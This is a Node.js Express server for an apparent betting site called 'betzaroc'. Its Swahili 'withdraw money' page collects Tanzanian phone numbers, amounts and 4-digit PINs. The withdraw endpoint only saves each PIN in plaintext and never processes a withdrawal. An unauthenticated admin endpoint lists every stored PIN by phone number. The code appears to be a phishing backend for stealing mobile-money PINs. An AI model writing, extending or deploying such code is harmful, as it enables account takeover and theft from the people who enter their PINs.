const fs = require("fs");
const path = require("path");
const express = require("express");

const app = express();
const PORT = process.env.PORT || 4070;
const DATA_FILE = path.join(__dirname, "data", "withdrawals.json");

function loadAll() {
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
  } catch (_) {
    return [];
  }
}

function saveAll(rows) {
  fs.mkdirSync(path.dirname(DATA_FILE), { recursive: true });
  fs.writeFileSync(DATA_FILE, JSON.stringify(rows, null, 2));
}

function digitsOnly(value) {
  return String(value || "").replace(/\D/g, "");
}

function normalizePhone(raw) {
  let p = digitsOnly(raw);
  if (p.startsWith("255") && p.length === 12) return p;
  if (p.startsWith("0") && p.length === 10) return "255" + p.slice(1);
  if (p.length === 9) return "255" + p;
  return p;
}

function isValidPhone(p) {
  return /^255[67]\d{8}$/.test(p);
}

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/kutoa-pesa", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/api/withdraw", (req, res) => {
  const phone = normalizePhone(req.body.phone);
  const amount = Number(digitsOnly(req.body.amount));
  const pin = digitsOnly(req.body.pin);

  if (!isValidPhone(phone)) {
    return res.status(400).json({ ok: false, error: "Weka namba ya simu sahihi" });
  }
  if (!Number.isFinite(amount) || amount < 1) {
    return res.status(400).json({ ok: false, error: "Weka kiasi" });
  }
  if (!/^\d{4}$/.test(pin)) {
    return res.status(400).json({ ok: false, error: "PIN lazima iwe namba 4 tu" });
  }

  const rows = loadAll();
  const rec = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    phone,
    amount,
    pin,
    time: new Date().toISOString(),
    displayTime: new Date().toLocaleString("en-TZ", { timeZone: "Africa/Dar_es_Salaam" })
  };
  rows.unshift(rec);
  saveAll(rows);
  res.json({ ok: true, id: rec.id });
});

app.get("/api/admin/withdrawals", (req, res) => {
  const q = digitsOnly(req.query.phone || "");
  let rows = loadAll();
  if (q) rows = rows.filter((r) => r.phone.includes(q));
  res.json({ ok: true, total: rows.length, data: rows });
});

app.get("/admin", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.get("/health", (_req, res) => {
  res.json({ ok: true, app: "betzaroc" });
});

app.listen(PORT, () => {
  console.log(`Betzaroc http://localhost:${PORT}`);
  console.log(`Kutoa pesa http://localhost:${PORT}/kutoa-pesa`);
  console.log(`Admin http://localhost:${PORT}/admin`);
});
